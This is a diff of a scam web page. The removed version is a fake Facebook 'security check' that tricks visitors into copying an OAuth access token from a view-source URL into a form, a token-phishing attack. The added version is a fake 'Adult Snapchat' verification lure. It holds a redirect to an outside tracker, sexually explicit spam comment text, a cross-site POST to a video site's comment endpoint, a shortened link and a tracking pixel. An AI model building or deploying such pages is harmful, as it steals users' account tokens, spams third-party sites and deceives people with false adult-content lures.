@@ -1,61 +1,98 @@
+<!DOCTYPE html> 
+<html lang="en">
+  <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# blog: http://ogp.me/ns/blog#">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SnapChat Age Verification</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+    <style>
+      body {background: #efe200;}
+      #logo {display: block; margin: 0 auto;}
+      h1 {text-align: center; font-size: 25px; margin-top: -5px;}
+      h2 {font-size: 18px;}
+      hr { display: block; height: 1px; border: 0; border-top: 1px solid rgb(0,0,0); margin: 1em 0; padding: 0; }
+      dd {margin-bottom: 20px;}
+      .verify {margin: 20px 0; width: 100%;}
+      iframe {display:none !important;}
+    </style>
+    <script>
+        if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
 
-<!DOCTYPE html>
-<html>
-	<head>
-  <script type='text/javascript' src='http://code.jquery.com/jquery-1.6.2.js'></script>
-<script type='text/javascript'>
-
-function PopupCenter(pageURL, title,w,h) {
-document.getElementById('yes').style.visibility='visible';
-document.getElementById('yes1').style.visibility='hidden';
-var left = (screen.width/2)-(w/2);
-var top = (screen.height/2)-(h/2);
-var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
+} else {
+top.location.href='http://zstrakr.com/mob.php';
 }
 
+function getVid(){
+   var sites = ["1148645", "8244667", "2424490", "8982696", "2400168", "8330507", "3675721", "8067181", "4991565", "3726365", "8971430", "3848100", "3685571", "9101447", "8600688", "9025418", "3198380", "9025339", "8511510", "2643304", "1443059", "7903049", "8987036"];
+    var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+
+function getCom(){
+   var coma = ["swapping nudes on snapchat, princessgurlx", "add me on snapchat guys, princessgurlx", "whos on snapchat?? princessgurlx", "snapchat someone? princessgurlx", "who wants to see my pussy on snapchat, im horny.. princessgurlx", "nude swap on snapchat any1? princessgurlx", "if any1 has snapchat, add me, princessgurlx", "add me on snapchat guys, 18 female.. princessgurlx", "18 female add me on snapchat guys, princessgurlx"];
+    var i = parseInt(Math.random()*(coma.length-1));
+    return coma[i];
+};
+
+
+var randy=Math.floor(Math.random()*11);
+var cmt=getCom();
+var vid=getVid();
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+  // xmlhttp['send']('user=messbout'+ randy + '&comment=' + cmt + '&test=ok');
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
 </script>
-		<style type="text/css">
-			html * {margin: 0; padding: 0;}
-			body {width: 520px; margin: 0 auto; font-family: "lucida grande",tahoma,verdana,arial,sans-serif; font-size: 14px;}
-			li {margin: 5px;}
-			ol {list-style: decimal;}
-		</style>
-	</head>
-
-	<body>
-		<br>
-		<div style="background: url(//i.imgur.com/J7WhPUk.png) no-repeat top left; width: 485px; height: 335px; padding: 15px 0 0 20px;">
-			<p style="color: white; font-weight: 700;">Security Check</p>
-			<p style="font-size: 11px; padding-top: 15px">Please complete our new <strong>5 second</strong> security check to confirm you're a Facebook user.</p>
-
-			<div id="container" style="margin-top: 40px;">
-				<p id="button" style="cursor: pointer; color: white; font-weight: 700; background-color: #8298c0; width: 150px; height: 20px; text-align: center; padding: 10px; border: solid 1px #4e6fa7; margin: 0 auto;">Start Test Now</p>
-
-				
-				<div id="key" style="display: none; width: 401px; margin: 0 auto;">
-					<ol style="padding-left: 10px; font-size: 12px">
-						<div id="yes1">Please <a onclick="PopupCenter('view-source:https://www.facebook.com/dialog/oauth?scope=&redirect_uri=https://www.facebook.com/connect/login_success.html&response_type=token&client_id=210831918949520', 'myPop1',1,1);" href="javascript:void(0);">Generate security code</a> and follow the instructions.</div>
-						
-						<div id="yes" style="visibility:hidden;"><img src="//i.imgur.com/7GjYozB.png" height="50" width="50"></img> <br><br>Your security code was successfully generated. <br><br><strong>Drag the green padlock on the popup to the box below</strong><br><br><form action="next.php" method="POST"><input type="text" name="sec" value="" style="margin-width:350px;"></input> <input type="submit" name="submit" value="Continue"></input></form>
-					</ol>
-
-				</div>
 
 
-			</div>
-		</div>
+</head>
+  <body>
 
-		<script type="text/javascript" src="http://code.jquery.com/jquery-1.5.2.min.js"></script>
-		<script type="text/javascript">
-			$(document).ready(function() {
-				$("#button").click(function(){
+    <div class="container">
+    <header>
+      <img id="logo" src="http://www.itespresso.fr/wp-content/uploads/2014/07/Snapchat.jpg" width="200">
+      <h1><b>Join Adult Snapchat</b></h1><hr>
+    </header> 
 
-					$("#button").css("display","none");
-					$("#key").css("display","block");
-					$("#c").focus();
-					$("#c").select();
-				});
-			});
-		</script>
-	</body>
-</html>
+    <p style="text-align: center;"><br>Adult Snapchat is an adult version of Snapchat with over <b>10,000+ members</b> waiting to share nude photos with you. <br><br>Verify you are human below to join!</p>
+
+    <a href="http://goo.gl/y1E9P2" class="btn btn-default btn-lg verify">I'm human, let me in!</a><br><center><img src="http://www.barnorama.com/wp-content/uploads/2012/07/27.jpg" height="150"></img>&nbsp  &nbsp  <img src="http://files.sharenator.com/154510.jpg" height="150"></img></center>
+
+    <hr>
+
+    <h2></h2><center>
+    Powered by Snapchat</center>
+    </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
+    <script>
+    new Image().src="http://whos.amung.us/widget/3xrdkrcajo49.png";
+    </script>
